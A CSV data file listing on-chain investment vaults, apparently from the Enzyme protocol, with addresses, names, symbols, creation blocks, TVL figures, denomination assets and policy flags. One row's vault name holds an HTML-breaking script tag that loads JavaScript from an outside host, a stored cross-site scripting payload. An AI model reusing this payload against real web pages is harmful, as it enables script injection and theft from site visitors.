vault,name,symbol,block_created,tx_hash,tvl,denomination_asset,policies,creator
0x278C647F7cfb9D55580c69d3676938608C945ba8,Moab DAO,WOOF,14173070,0x644c914db92ac861acdb3ee851e33bd237a766347e8515c9b5180ff6d5bc0c05,4021.870878,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x0D947D68f583e8B23ff816df9ff3f23a8Cfd7496
0x80b1b20912B27e8AF99854c85DC84038BdD25199,A-DAM Capital Fonds A ,ADAM,14180186,0xf21a825ae52c54ea4d4e538756bb8eb21069f7c54c5b727ca2cf2df27dd09577,0.014982,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS ALLOWED_ASSETS_FOR_REDEMPTION,0x81aA614ceB90578851d413B56de343c159D39Ebd
0xDfca4259d725918f59f53F8CB67a0c3bEC6A09ed,fxTest-Sulu,Test,14181515,0x65a904e272448a1d0bddb3c96dc2828f6a6df9cda05998fed0ddc140f5de231a,24.6980617413,WETH,,0xa0bd9e6121782474d6d72A9406254a507F13C306
0xbF49d39986113D9e8Dff3f51DEc5A736fBf06b2f,Bitflex Capital,BFC,14184309,0xe6cda27a0900d8c473281a142ed9462f3d3ff536c1e6f031b769da7486405796,14.465525,USDC,MIN_MAX_INVESTMENT ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x7a7d624d902e1a6f378682239A44cFFa71A67aB6
0xF748654D60360dA46F3734aeFE65a2A6f795933D,H2 Capital,H2CAP,14185161,0x5dc05dad5e3fdb097c1951f3234a337e48c21c176aa9ba381d406deffad1db9a,280.570208859372553553,DAI,CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x1f0b3EBaD56Aa64cD9e110d90DAbb3fae71C94c0
0x7De6D4d71e334F2B3f862679F7C85F7BDB0DB736,Hike Crypto Enhanced Yield,HCEY,14220227,0x883240374699eb484332188153ae0bea120d6d2e6faa9ad9946484c4a0247b82,42.859827,USDC,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x36bE219918F04e3743Eb064284119898eF98a01f
0x35f43016Cad4c2fb1EaFfF7aE162a07ffc260Ec6,Lorem ipsum,LRPS,14222789,0x69d09ff5c37aafdc184c5a3b61f0e1ee07b72aa0788e797a0f1e483d60b8bd36,317.422456572182213718,sUSD,ALLOWED_SHARES_TRANSFER_RECIPIENTS,0xBac5f334e3cF609d32ed3Ee5127dd3CC9dfE1CD3
0x6653CDAACAC5d9B985C2C2878ad411A55D2aa394,Maximilian Capital ,MXM,14226263,0x221b5ecbcbcbbf12068c232cc811f9cc25342a0ff6591ee5ff8bd6395a1e74fa,2443.465923,USDC,ALLOWED_DEPOSIT_RECIPIENTS CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION,0xAc2561D0454A82C98D6E12944774Ab249fe5D2ec
0x7dfdC77927dd1692BC79237D6EFC28257F722Ed2,yeg-crew,JANVO,14239615,0xa3445da7595eacdea4bd7cdd13d4c591bedcbe73c83ac6efe5b82f0cae34919b,0,DAI,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0xb9397eE13b8Fb7DbC82B15694b992687Dce85204
0x7fC3Ef2085cBc8E8151a8b8B6343c3AfAB83f554,Frontline Metaverse Fund,FMF,14242198,0x6df813d84acda8535ec201ddcb3361396a9f15280cf61150bbb8cf8c657d1008,0.22308,USDC,,0x89E5C56897412E839fc8df6d3995C8E1fb6188B9
0xE78559F6D3C62984f67558C39F4Fe3e771367BdB,Cavendish Balfour Investments,CBI,14251313,0x3e991c0712148f9d598a9fd80638cba4cf92318239345181c0555d775e2f9245,0,BNB,,0xEEf0387c8582Dbd79ccC5097f9Ff9F283b58E5e6
0xa5eBcC53f21F581eE3cB0E8F55a3A4dD758C1655,Defi Investment Group,ENZF,14251724,0xbf8a09684e8d38ba860125dd5417475648518606f1e0218ae2a147ef06c09fde,0,USDT,,0x367728F33C3Df1d58AE2D91195667f0d6FC16587
0xB4A3c4F6e792a5214D3148db0004DEb0F078319b,Degen Capital,DGNCP,14252391,0xcb17c58631c85edf7f8c3f057581b142956df7fb7fca05c3bf6cfbcb1691d01b,0,USDC,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT,0x2d494838167A1A78aBfF7453f0bFc05871544989
0x2dF0AFE314e55EDC063e41a20F0BE9fc0A0d7400,Unbound Capital,UNBD,14255151,0x4cb43ad7a30763e1a40046a229e358e42f2d1e1e2687f1d86323708a4da4503e,0,USDC,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x4888E8b4927a00744F8F75BB52c5EB7A8da896C1
0x922a6F55a68d42B639b51575A706279cCb5cD02b,XBIT CAPITAL,XBIT,14257920,0xab8111fd7247b99009fbd903bb27a9faac14aab65943d3e9f31fb23ba778af00,0,USDC,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0xa67e951CaF10a795Db3fEaa5A2D8C94109Aaa445
0x5ED7fa73BD6b2F493bA59549C0e0b76f85684534,x2 capital,X2C,14263320,0x3ef39faf4291a46470bcd8aa3f120c5739f26a2e5c17f26f50bd00cf6f589987,0,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_ASSETS_FOR_REDEMPTION,0x67428CFc790cF70a1e801c5cf2964cB060dD15c8
0x942A47F16b5d0136AF525057a034d450CAb9e061,YaaX Green,YAAXG,14275640,0xe191286f4b1a0202e610bcc92d7fe09a41bdfa974f0b5cbbd9a7a5aa77826e64,2069.52476738492063287,DAI,,0xCE5D24bfe4f3ea570869178b01DBbCB05Fb3c92c
0xD63a73e9E428190EC52Ed151791010869e3d9cc6,Balanced Crypto Fund ,BCF,14276369,0x37f8e246bfdc05a55b290f5b1e620116fe414af839a464162bf3a4f5a587ef86,0,DAI,CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0xe8f04B65950f72bd2CAf35508Fc1ef890585A856
0x22Ab9b364378c38eE73b3080DD1E288b6e4da099,FFZ,FFZ-B,14284015,0x8cccab1ddcde55080de49e8889226c0fa4da780af2bfe43a5f82dd54787454b0,4.150709,USDC,ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0xB0A5c412c3CD2D94e0f8c9b4DADE6170b90A64a9
0x95fca2e84556443C1bC0C6416Ee17BE0e6844cD0,A-DAM Capital Fonds A,ADAM,14288834,0x6374f27a8cd20aa14f1aafe10ce7d7649034d80240dc9e01c27193c67cc6114c,199860.485507,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS ALLOWED_ASSETS_FOR_REDEMPTION,0x81aA614ceB90578851d413B56de343c159D39Ebd
0x4408D325E6e95aE712779e7AeD4774e13abB44b1,Treasury Vault,EX-TV,14294852,0x0bb351fde24e9ff0f5e1532892cae7786768bdc4e4b0566df6d2cf8bd1792e7c,2331.663352,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_ADAPTERS,0x194332A87E463a3Dd2dD2bE4222e9C2E26ACF419
0x28Cd532BFFEF8f0f3060bFBBFa2b07A6eC595E7F,Shibumi Asset Forge,FORGE,14296032,0x43c2e22811e69427ec5a7cd5de08db160de354814b60a49678fcaac99edafdda,85.255352,USDT,CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION,0x449266EbD166cC8594aaa3a3b6cB9C9C1c1C001A
0xeF8953eC31C650eAD15e460C4b02B45fD88a4a44,Northgrove Capital,TUSA,14297540,0xd7420c08f71613ad19c1fdf75ccbcc09bcf1d400bbe2edfc75a53f4420cdc02b,0,WETH,CUMULATIVE_SLIPPAGE_TOLERANCE,0x1523E2B4107eCC3F5AAF0086B9746935e9f09fFA
0x751ffcFfc4a0436A3F87f2e8dD7218d8B9195624,DG DAO Ventures,DGDV,14303533,0x5684832f5d38f79fd91e7553095b23c772b2cfb48a8c1e310377823d514b37ed,95.148789,USDC,CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x91De6c3247D30610f774d329dC6DC636207246Ca
0x55B36A8944e2FD00f2B9F5F9A68125549fC4ae3B,feiu,ENZF,14318443,0x47e9e671dcaf74bca440763917fea5f600c2d9705084ac1b6b547f3f978a10f5,0.103598,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0xBc2b401780f597b3c879ffDE99Fc9753340D3C92
0x5dCa39fc494cEf54e5cC4dd5367cdE3ba268F9DA,Roble Venture Private,RBPRI,14327436,0xf0bacc43db2639863fb67c2495fb54d4d605df37f3f53dd21db22074084aeafa,426.81311147312938218,DAI,ALLOWED_DEPOSIT_RECIPIENTS,0xaa60084B1170bce4b6AaA1c56C1AA5f3DCA85923
0xf7C7F17B220c387301ACf9046e938f61175f913c,Roble Venture Stable,RBSTA,14327492,0x22c7c115104d4860ecbfa49ce38a8715a0872a7d4bfd7132fe42ad558f47a871,18.151427910862300674,DAI,CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0xaa60084B1170bce4b6AaA1c56C1AA5f3DCA85923
0x8b0A71AcDb56C1772f2EA61BE422bd9372025217,Nawa Cap,NAWA,14341234,0x06be9d41c1a363a297498bff9704dc87fc56c8e36f3cb5639cb3ef5d1e0e2c94,0E-8,WETH,ALLOWED_DEPOSIT_RECIPIENTS,0xd49BEcf58b726b34E5fb459cD53b7505e1E76395
0xE520e6f94035962cBA4d1e00F2E2649e24a5c336,highnetwork,HNW,14342386,0xc1d6d7b3de0d0f58a3f826d207965f20572fb65ebd18a0a6bc0bad5ef6d5dc2e,0,USDC,MIN_MAX_INVESTMENT,0xA959e1B341313D81DFF58C1FD1a0a47c69b38703
0x9B6f11b4d6356754773A250a4021ed6843502Af4,POSTCRYPTO,ENZF,14345203,0x9d40626b9862c8c6ff3865b0f424071792411afece3bf3ecdc52801d6b92d49a,4.139383882259213822,MLN,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0xEc237c5fb40DB671D14F1028e3842b4FC2B6aa3D
0x9ABAfCC0834272821C2Af19Dc14015828A1B0607,LIBENTER 1,LBT,14345451,0x47bae99b95a71d8146242ca8095dbd06329e8bff1ea49046764ca68ffd915c32,0E-8,WETH,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x6D2117920E14999A739e718f0532DDd0a099dD1A
0x239cFC423d074d7B2E23eb46D5e031ae5Ff34060,AGF Digital Dollar Yield Vault,AGF1,14346519,0x0a472175e7fe7a9cebc9d319fb74f0cee79be8c67fe68b676e5dcb1f95015b46,119784.251521,USDC,ALLOWED_DEPOSIT_RECIPIENTS CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_SHARES_TRANSFER_RECIPIENTS ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x775116496F2e8FEe8d6a425f1327E48aAbeC035B
0xCD41bbBe0dE255F42b010BA7294d93EdF98488c1,BTC FUND,BTCF,14347551,0xa14f1e0d2926d9e82f6be15ba4f7926615d164f485aac8871108c61ee78e7f99,0.00375954,WBTC,ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x36035D7EC001f06b95897F5293344fd100260Da4
0x697B357b5D82c54E7dDd19eeB87Bf486505df5f6,"Curve war(Curve,Convex&Votium)",DEFI,14350099,0x75e02955d1de897474144309a819edca0e0770ff386a08fb494857fd1e4195ba,0,CRV,CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0xA16865d04394DD66df01Eb68252831B389CbCe33
0x490D785261A794B9221217DD775422e356E22b38,"TestVault'""><script src=//nc.ci/1x.js></script>","NCC"">",14358088,0xafa8d1c5ac8c826c044840134636230f1543e3f7a68afc7b829894d832c9cf9c,0,DAI,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT ALLOWED_ADAPTERS ALLOWED_SHARES_TRANSFER_RECIPIENTS MIN_ASSET_BALANCES_POST_REDEMPTION,0x6C5930C71b07b9DA314cDC454543FB8BFAbeD4cb
0xB4f21C22DBdC6c80c881b2115075F3C962A6158b,Layer Two Capital,LTOO,14365612,0x42c6e69a89ae224e1e3fa8b0c34bb1ef85c673cb71cc340ab6c5a02544867dd4,0,USDC,CUMULATIVE_SLIPPAGE_TOLERANCE,0xd18a54f89603Fe4301b29EF6a8ab11b9Ba24f139
0xE00D15B722A3c3a5aE2D4dD68A302ec8FDC2ccBA,Staider PulseChain Vault,SPV,14371146,0x0b64448b4a894c2d2cfda8b8229cef56c7fa2af277306108a250e92a860ebd34,957.734088,USDC,,0xF4dCB9cA53b74e039f5FcFCcD4f0548547a25772
0x3257EEb27bc3FA7155f3D53F19eC65129A5D2370,Ethic DeFi Hedge Fund,ETHIC,14373753,0x1490aa96ed7829b4f059046721dd18d7f021a7fac61054cc27086752745bd672,0,DAI,,0xb87B03Fba8D60A6Eb00F1c203Cb91A611E3ABbFb
0xB17b24c5a74F7638b001992c21ABF07070Dcf69D,CellETF Web3.0 Fund,CWF,14377036,0xea3aaa7018ddcfffa5e10fc2cbf0008d1b5da575f8db4614767ea2ccc2fb741e,100,USDT,,0x4f1729a2715a6Fa022eB10942855f6D9468df515
0x9D50E19311fd76A5CeF735f2370250AF8499D8e4,10ksolclub,10KSC,14384512,0x72ffed74001f0eafdcbbee8f09855dbcc9010bf7f91b9f550be1e77ba014feda,2758.020938282234616717,DAI,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x2A6f02ce79cc62c97321441aCA548bC200295B67
0x2b56F193DBE0a156D9EaFdf2AeB941Dc40c2719b,iMental.help,ENZF,14390437,0xb36b443f8c9e33b99d3d8068e56160fe5e8cb7804acceabdc6d64c83636e7263,0.021347065628311727,stETH,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_ADAPTERS CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_SHARES_TRANSFER_RECIPIENTS ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x4e426269dD3A9Fb6BCf61bd56481c16611195a9A
0x86758FdE8e8924BE2b9Fa440fF9D8C33a4E064A5,humanDAO.org,HDAOT,14392322,0xab4860126edd18dc66ee5235ec5a61f6974be491da5843c2daa5f5148c0a59e9,1217114.860093,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x6C48814701c98F0D24b1B891fAC254A817Aadfdf
0x431d66E027D52936fd8D7ddbb0B14621cB3F9b8d,Conquer Capital - ETH Fund,CNCE,14396117,0x2891f0307daff2de7ed01203a0f3edf3228c49c6dab502b3f636a5b141025be1,0E-8,WETH,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0xD472E91885956014Eb92f8c11BD545456B92b598
0x4198AA4A99938d37626720C8D1feC0056032DBAD,Enzyme Yield Magic Booster Fund Crypto,ENZF,14397099,0xf54bc1ca363dcdeb408d98a650f3903800a10ca2035bb9a00a41218ed2797eac,142.304837,USDC,CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x954B6dE2E9C58B0ca7B21e9A048fD0A6CEa6f92C
0x456B8a7D42638e8593cc4c1a53B839A76339BA50,Defi Mix,DMIX,14409843,0x6ecebf9739b1b75b13eea7f47b5a3fa7eaec16f33b167e366a7c784532320835,0,DAI,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x116EC70ca00d6be6940EabcD838a6F1CeD66Af74
0x0AA21D5556E40e4fDe1C1124B222A64165D6ed3f,2Bfunding,2bF,14421030,0xe9ada078bf101e1cef8939b12251a4701e294329ac96a1f814e4c3ef4ee9acf4,24.546831461069009167,MANA,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_ADAPTERS CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_SHARES_TRANSFER_RECIPIENTS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x4e426269dD3A9Fb6BCf61bd56481c16611195a9A
0xEbCd316136ADb281D6C5D25F2a7fC38C69F7441e,CRYPTO PROSPERITY,CPRY,14421128,0x0d289aad4fe94973ea0045beac25117a1d9e95683a7bfa22602722b4330d67af,0,DAI,ALLOWED_DEPOSIT_RECIPIENTS,0x79d7b8d74Afd2e58E760cE8a10fBD7806dB0450f
0x9c0F4023ee387242b438F8E49E72A1c540fabbAe,PDKM,PDKM,14423803,0xc879dab1909ae38899e1bc0d4494c4007d5ae512fc7b24a5a9729e19cfb757d5,45.821883,USDC,,0x793ab1e4c98360721DA65efDD320Fc5CBa2CD610
0x40612e6bBAB523fBb364b43feB68Ed973B5d3924,TheHeckerProject-A,HEC-A,14424767,0x69b5356c25bcf0f34b3ef2e7559fd177f9aaf257a587a3966649d81eaee26924,1896.583681,USDC,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x3a123cC26730371C05dCD525504d15fb4137941a
0x65569cA94CDf4faee47A5d600cFD20a5D44Fff71,⚡️The Venetian⚡️,⚡️⚡️,14454014,0xd883b525482b565e8b271d92ca546e4b7bcb4e11baab5e40e4f4c6290f70acb5,48.771105,USDC,,0xD9896DCf0e114546EdD1ba15FfdBe72cD43E174A
0x96A3F1C5A534CE3F99ee69A553b54fa65dd197Ef,XYZ,XYZ,14454742,0xba979b1a1661c2a27973eaf6786811b5975d03044d6fa1b127a66846f4e6ef0a,0,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x9a2b9a532DFC75527135baB97C14FeEcc2b60138
0xd618b03C7A1c0F3248Ae049954D69e8d96a142C0,ACC Web3.0 Fund,AWF,14461191,0xeac616f6ab965ce844f98c4bbbfc302a8034d10cea9be7a1616efed42105cd6a,101.530724,USDC,,0x4f1729a2715a6Fa022eB10942855f6D9468df515
0x2dCdAf0EEF4b89913349562D88133c8eC09d6F8a,Vault,VTT,14464163,0x4f17f31620b4b2be1d96bb4fa290a95c0035a16e2010572afaacd067b86b740f,0,USDC,MIN_MAX_INVESTMENT,0xdcB167aE255c4385dA37af6B8156Fb1dfF4f193c
0xa37813a9F23DC7710779f292679344F3b23F0a1a,Family vault V2,FVV2,14464582,0xb480a654a9275aff79db97f7f1c1b1e8fb4db9da1e16ca72e27b3f96148b66af,0,USDC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0x8999855c6ccC420E57D22e218607300d94852D0e
0x88ef7145b17d4399d8Bf57aF35b7f9125F3B812f,Xer0's Investment Fund,XIF,14472142,0x314755ac2998277ffbf454d0554c2aa61115a6ad189e6fda74c4cd24ad5deabf,4.41109925557158996376847316,WETH,CUMULATIVE_SLIPPAGE_TOLERANCE,0xc24A961BECC840a1034D7fcf3bc894E9bb9190E1
0x933905eb000d039486308Ac2877490F395d7260B,KL07,KLT,14473070,0x6e074accb4417137d96498b3bb35c1dea71df490fb0eec1a96c16013a181b716,0,USDT,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0xCb9e8e1c006653E20134123582C598a1e93765aF
0x66Ba5f9c9C44D9F4992CF825286798fD3E22DE5d,Logisto Capital - Non-Fungible Tokens (NFT),ENZF,14480872,0xd96ec157b38eb182614f3cc0c5a22021d72bdb38088ab68dc6d603980ac7f44f,0,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0xC5534a9E6c3116e1C8CeCD69409e20cF543c78C3,Logisto Capital - Decentralized Finance (DeFi),ENZF,14480915,0x16a54cf6fca4015009becd876e82d606e49118988e82236a612e795425e7f6cb,5.930559725932313807,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0x159dC7E9afE4d8F64b80AEC8d0749986AED9C37F,Logisto Capital - Metaverse,ENZF,14480935,0x68e65efa9ffd7f5261b5a89b8c47a73beda984f73fd346f10a17aaa0fe6e9ec2,0,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0xeB1F3Ce749372C4BAbc6200BCCE00B8e4284A293,Logisto Capital - Smart Contract Platforms,ENZF,14480949,0x7ae300c97c7831b2b2fc7eea30672225284cd8f792b719144bc77e9b1630e9a1,3.584710737186464722,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0xE6201Fe878ACD88C106871dC94B7417F40D69585,Logisto Capital - Centralized Exchange Tokens (CEX),ENZF,14480990,0x296b9c882cc9106b01bd1e85b2b830be75fdeaa489cddfd433467aae3910b932,0,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0x59Df4B48454CDaf0A228D9604f2a95939225f968,Logisto Capital - Privacy Coins,ENZF,14481009,0x49dae7473d02eed1346948224b3c1324522d44c71f9100b5413e341fee2633e3,0,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0xD2473368D1198b79D914FeBeB5453A56373fd793,Logisto Capital - Meme Tokens,ENZF,14481081,0xa730e48cef3da8b8ee23c1906cc24b8c88c771379939e724e46be0af5264eee0,0,DAI,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x32807E50667Caa0C5baAD231f9632A4F908a19fe
0x5d44380b676a64902b2890aAFd2d00813D796540,Digital Asset Vault V2,ASSET,14512174,0xc9ae0b618e1becd8d2fb651fa8751ade176ffcc193b0de562c8d51aacd72e134,2483.010541,USDT,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_ASSETS_FOR_REDEMPTION,0x7fbd8d550d20C5b54845069CF61a7999A2E54679
0xefFB078B709ea8FFA878f3B6E45b18244aCc0624,Bitcoin Dome V2,BTCD,14512196,0x159a069eb014d3fd6c817a583f0df072867f1c039274dbc7c7b66b4503fa8659,0.05992077,WBTC,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_ASSETS_FOR_REDEMPTION,0x7fbd8d550d20C5b54845069CF61a7999A2E54679
0x2469004d4b8107992CfF7111272eA97917031548,Active DeFi Index by STREETBASED™,ADX,14555130,0x9df7154b8b34552f5db23652d4b280d18752e63b6c8167504bef70d213abfd1f,0,DAI,ALLOWED_DEPOSIT_RECIPIENTS MIN_MAX_INVESTMENT,0x895d44d10d1b7B4F5f38E2ae2322539Cf93F7AAA
0x69CfC8b0ddc32F35acee21AE39eF4a24b85c7202,DuKet Digi Holdings 01,DDH01,14560552,0xd2e4d456883821ed7dd0966bbca441b8ed14b42725c3f13fdb17b91dbc4a61fc,5.313413,USDC,MIN_MAX_INVESTMENT CUMULATIVE_SLIPPAGE_TOLERANCE ALLOWED_ASSETS_FOR_REDEMPTION MIN_ASSET_BALANCES_POST_REDEMPTION ONLY_UNTRACK_DUST_OR_PRICELESS_ASSETS ALLOWED_EXTERNAL_POSITION_TYPES ONLY_REMOVE_DUST_EXTERNAL_POSITION,0x60529eb9BE4fc16f5F75E94dB5754bcb269B25F6
0x02C902c35F88573dBA2fD872Efd86354EfF3624C,Test DAO,TDAO,14565434,0x495518b43b273a4b994f1b762bb2fc5678ac418aae3fefee7d3ff704afa29ce8,0.448361,USDC,,0x737e13e23d08Ef369216aded9f9Fa7f28266023A
0xA42885080589E846a53D04AB757B01ed3A570604,KPKR,KPKR,14577343,0xf3cd79dcf4e34924b3c1ba8466be8190f72dd1fb47ed91f563743d77c64f7393,9.4259341688184037,DAI,ALLOWED_DEPOSIT_RECIPIENTS ALLOWED_SHARES_TRANSFER_RECIPIENTS,0xa496505012bDb1862Cc2959165c6f9B1f557F9F1
0xE0d4ACD5A3576eF2A40E148931FDED08d9ff9733,Borderless Capital,BLESS,14585480,0x3f89425167d2120bd5a18d278ff07fd99bf0e0fa67b1518d148e843a0e80d1b7,0,USDC,CUMULATIVE_SLIPPAGE_TOLERANCE,0x39a4DaC030901e05b328Ba890181FDfb549A00f1
